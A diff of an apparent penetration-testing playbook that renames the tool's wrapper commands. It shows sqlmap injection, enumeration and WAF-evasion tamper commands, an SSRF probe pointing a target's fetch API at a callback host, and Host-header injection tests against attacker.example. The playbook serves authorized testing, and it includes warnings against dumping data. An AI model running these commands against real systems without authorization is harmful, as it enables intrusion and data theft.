@@ -78,24 +78,24 @@ Look for:
 
 ```bash
 # Basic GET
-scripts/openghost.sh exec-tool sqlmap -u "https://<target>/page?id=1" --batch --random-agent
+openghost run sqlmap -u "https://<target>/page?id=1" --batch --random-agent
 
 # POST parameter
-scripts/openghost.sh exec-tool sqlmap -u "https://<target>/login" --data="username=test&password=test" -p username --batch
+openghost run sqlmap -u "https://<target>/login" --data="username=test&password=test" -p username --batch
 
 # Authenticated request file
-scripts/openghost.sh exec-tool sqlmap -r /workspace/engagements/<name>/evidence/http/request.txt --batch
+openghost run sqlmap -r /workspace/.openghost/engagements/<name>/evidence/http/request.txt --batch
 
 # Cookie injection, marker with *
-scripts/openghost.sh exec-tool sqlmap -u "https://<target>/page" --cookie="session=abc; id=1*" --level 2 --batch
+openghost run sqlmap -u "https://<target>/page" --cookie="session=abc; id=1*" --level 2 --batch
 
 # Enumerate with limited safe output
-scripts/openghost.sh exec-tool sqlmap -u "https://<target>/page?id=1" --dbs --batch
-scripts/openghost.sh exec-tool sqlmap -u "https://<target>/page?id=1" -D <db> --tables --batch
-scripts/openghost.sh exec-tool sqlmap -u "https://<target>/page?id=1" -D <db> -T <table> --columns --batch
+openghost run sqlmap -u "https://<target>/page?id=1" --dbs --batch
+openghost run sqlmap -u "https://<target>/page?id=1" -D <db> --tables --batch
+openghost run sqlmap -u "https://<target>/page?id=1" -D <db> -T <table> --columns --batch
 
 # WAF tamper examples
-scripts/openghost.sh exec-tool sqlmap -u "https://<target>/page?id=1" --tamper=space2comment,between,randomcase,charunicodeencode --batch
+openghost run sqlmap -u "https://<target>/page?id=1" --tamper=space2comment,between,randomcase,charunicodeencode --batch
 ```
 
 Do not dump bulk production data. Extract schema and one redacted sample if authorized.
@@ -207,7 +207,7 @@ Use unique markers and screenshots. Avoid affecting real users.
 ### Detection
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s -X POST -H "Content-Type: application/json" -d "{\"url\":\"http://<callback-host>/ssrf-test\"}" https://<target>/api/fetch'
+openghost bash 'curl -s -X POST -H "Content-Type: application/json" -d "{\"url\":\"http://<callback-host>/ssrf-test\"}" https://<target>/api/fetch'
 ```
 
 Use approved OOB infrastructure only.
@@ -433,8 +433,8 @@ C:\inetpub\wwwroot\web.config
 Test:
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s -I -H "Host: attacker.example" https://<target>'
-scripts/openghost.sh exec-bash 'curl -s -I -H "X-Forwarded-Host: attacker.example" https://<target>'
+openghost bash 'curl -s -I -H "Host: attacker.example" https://<target>'
+openghost bash 'curl -s -I -H "X-Forwarded-Host: attacker.example" https://<target>'
 ```
 
 Impact paths:
